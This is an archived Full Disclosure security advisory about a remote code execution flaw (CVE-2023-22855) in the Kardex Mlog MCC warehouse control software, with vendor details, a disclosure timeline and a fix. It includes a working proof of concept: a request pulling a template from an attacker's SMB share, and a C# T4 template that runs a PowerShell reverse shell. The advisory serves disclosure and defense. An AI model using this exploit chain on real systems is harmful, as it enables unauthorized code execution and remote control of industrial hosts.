@@ -1,0 +1,259 @@
+---
+title: Remote Code Execution in Kardex MLOG
+url: https://seclists.org/fulldisclosure/2023/Feb/10
+source: Full Disclosure
+date: 2023-02-18
+fetch_date: 2025-10-04T07:26:56.527377
+---
+
+# Remote Code Execution in Kardex MLOG
+
+[![](/shared/images/nst-icons.svg#menu)](#menu)
+![](/shared/images/nst-icons.svg#close)
+[![Home page logo](/images/sitelogo.png)](/)
+
+[Nmap.org](https://nmap.org/)
+[Npcap.com](https://npcap.com/)
+[Seclists.org](https://seclists.org/)
+[Sectools.org](https://sectools.org)
+[Insecure.org](https://insecure.org/)
+
+![](/shared/images/nst-icons.svg#search)
+
+[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
+
+## [Full Disclosure](/fulldisclosure/) mailing list archives
+
+[![Previous](/images/left-icon-16x16.png)](9)
+[By Date](date.html#10)
+[![Next](/images/right-icon-16x16.png)](11)
+
+[![Previous](/images/left-icon-16x16.png)](9)
+[By Thread](index.html#10)
+[![Next](/images/right-icon-16x16.png)](11)
+
+![](/shared/images/nst-icons.svg#search)
+
+# Remote Code Execution in Kardex MLOG
+
+---
+
+*From*: Patrick Hener <patrickhener () posteo de>
+*Date*: Thu, 16 Feb 2023 08:13:05 +0000
+
+---
+
+```
+Remote Code Execution in Kardex MLOG
+=======================================================================
+                   Product: Kardex Mlog MCC
+                    Vendor: Kardex Holding AG
+            Tested Version: 5.7.12+0-a203c2a213-master
+             Fixed Version: inline patch - no new version number
+        Vulnerability Type: Improper Control of Generation of Code ("RFI") - CWE-94
+           CVSSv2 Severity: AV:A/AC:L/Au:N/C:C/I:C/A:C - Score 8.3
+           CVSSv3 Severity: AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H Score 9.6
+           Solution Status: fixed
+ Manufacturer Notification: 2022-12-13
+             Solution Date: 2023-01-24
+         Public Disclosure: 2023-02-07
+             CVE Reference: CVE-2023-22855
+       Authors of Advisory: Patrick Hener & Nico Viakowski
+
+=======================================================================
+
+Vendor description[1]
+---------------------
+
+Kardex Mlogâ€™s modular software solution Kardex Control Center manages material
+flow and warehouse management processes faster and more efficiently.
+
+From manual block warehouse and interface networking with intelligent partner
+systems to an automated intralogistics system connected to production lines and
+driverless vehicles, intelligent energy management for the automated stacker
+cranes and modern system visualization, the Kardex Control Center modules offer
+flexible solutions for your warehouse management.
+
+Vulnerability Details
+---------------------
+
+The .NET based software spawns a web interface listening on port 8088.
+This interface is meant to control and monitor the material flow.
+
+The user controllable path is handed to a path concatenation function
+(`Path.Combine`) without proper sanitization. This yields the possibility to
+include local files, as well as remote files (SMB). The path is used in a
+function called `getFile`.
+
+The following code snippet shows the vulnerable part of this function:
+
+```cs
+public MccHttpServerResult GetFile(string path, string acceptEncoding, string queryString = null)
+        {
+                MccHttpServerResult result4;
+
+[... snip ...]
+
+else
+{
+        string getfileName = (path == "/") ? "index.html" : path.Substring(1).Replace("/",
+Path.DirectorySeparatorChar.ToString(CultureInfo.InvariantCulture));
+        string fileName = Path.Combine(this.RootDirectory(), getfileName);
+        string originalFileName = fileName;
+```
+
+The .Net function `Path.Combine` also is able to concatenate remote targets. For
+example using `\\ipaddress` you can include files from a remote samba server.
+
+Further down the request flow, the application is checking for the MIME type of
+the file retrieved.
+
+Depending on the MIME type the content is either sent through a
+import/export procedure or rendered as `mono/t4` template. The function
+`getMimeType` will return `t4` if the included file is ending with an extension
+of `.t4`.
+
+This is where the File Inclusion can be escalated to a Remote Code Execution.
+The `mono/t4` templating engine allows the use of `C#` to evaluate code.
+This enables an attacker to gain code execution and eventually spawn a reverse
+shell.
+
+```cs
+bool flag15 = File.Exists(fileName);
+        if (flag15)
+                {
+                using (FileStream f = new FileStream(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                {
+                        byte[] bytes = new byte[f.Length];
+                        f.Read(bytes, 0, bytes.Length);
+                        bool flag16 = mime2 == "t4";
+                        if (flag16)
+                                {
+                                        return this.runTemplatingEngine(bytes, responseHeaders, queryString);
+                                }
+```
+
+Proof of Concept (PoC)
+----------------------
+
+The following request will include a remote file from an smb share. For this to
+work the attacker has to spawn an smb server (for example using `smbserver.py`
+from Impacket[2]).
+
+```
+GET /\\attacker-ip/share/exploit.t4 HTTP/1.1
+Host: vulnerable.host.internal:8088
+Content-Type: text/html
+User-Agent: curl/7.86.0
+Accept: */*
+Connection: close
+```
+
+The `exploit.t4` looks like this:
+
+```html
+<#@ template language="C#" #>
+<#@ Import Namespace="System" #>
+<#@ Import Namespace="System.Diagnostics" #>
+
+Proof of Concept - SSTI to RCE
+RCE running ...
+
+<#
+var proc1 = new ProcessStartInfo();
+string anyCommand;
+anyCommand = "powershell -e revshell-base64-blob";
+
+proc1.UseShellExecute = true;
+proc1.WorkingDirectory = @"C:\Windows\System32";
+proc1.FileName = @"C:\Windows\System32\cmd.exe";
+proc1.Verb = "runas";
+proc1.Arguments = "/c "+anyCommand;
+Process.Start(proc1);
+#>
+
+Enjoy your shell, good sir :D
+```
+
+The exploit above will execute `cmd.exe` and launch a `powershell` to execute
+a reverse shell. You can easily generate a reverse shell blob using
+revshells.com[3].
+
+A full exploit spawning a reverse shell was created[4].
+
+Solution
+--------
+
+The user supplied data should be sanitized before using it in the `Path.Combine`
+function.
+
+Disclosure Timeline
+-------------------
+
+2022-12-13: Vulnerability discovered
+2022-12-13: Vulnerability reported to manufacturer
+2023-01-24: Solution provided by manufacturer
+2023-02-07: Public disclosure of vulnerability
+
+References
+----------
+
+[1] Vendor Website:https://www.kardex.com/en/mlog-control-center
+[2] Impacket Git Repository:https://github.com/SecureAuthCorp/impacket
+[3] Reverse Shell Generator:https://www.revshells.com/
+```
+
+[4] Exploit on Exploit-DB (tbd):<https://www.exploit-db.com/exploits/xxxxx>
+[5] Blog Post Advisory:<https://hesec.de/posts/cve-2023-22855>
+[6] Personal Github Repo for Advisory:<https://github.com/patrickhener/CVE-2023-22855>
+[7] Blog Post Thinking Objects:<https://to.com/blog/advisory-kardex-mlog-CVE-2023-22855>
+
+```
+Credits
+-------
+
+This security vulnerability was found by Patrick Hener and Nico Viakowski.
+
+E-Mail:patrickhener () posteo de
+```
+
+E-Mail:n.viakowski () pm me
+
+```
+Disclaimer
+----------
+
+The information provided in this security advisory is provided "as is"
+and without warranty of any kind. Details of this security advisory may
+be updated in order to provide as accurate information as possible.
+
+Copyright
+---------
+
+Creative Commons - Attribution (by) - Version 3.0
+URL:http://creativecommons.org/licenses/by/3.0/deed.en
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: https://seclists.org/fulldisclosure/
+```
+
+---
+
+[![Previous](/images/left-icon-16x16.png)](9)
+[By Date](date.html#10)
+[![Next](/images/right-icon-16x16.png)](11)
+
+[![Previous](/images/left-icon-16x16.png)](9)
+[By Thread](index.html#10)
+[![Next](/images/right-icon-16x16.png)](11)
+
+### Current thread:
+
+* **Remote Code Execution in Kardex MLOG** *Patrick Hener (Feb 16)*
+
+![](/shared/images/nst-icons.svg#search)
+
+## [Nmap Security Scanner](https://nmap.org/)
+
+* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org...
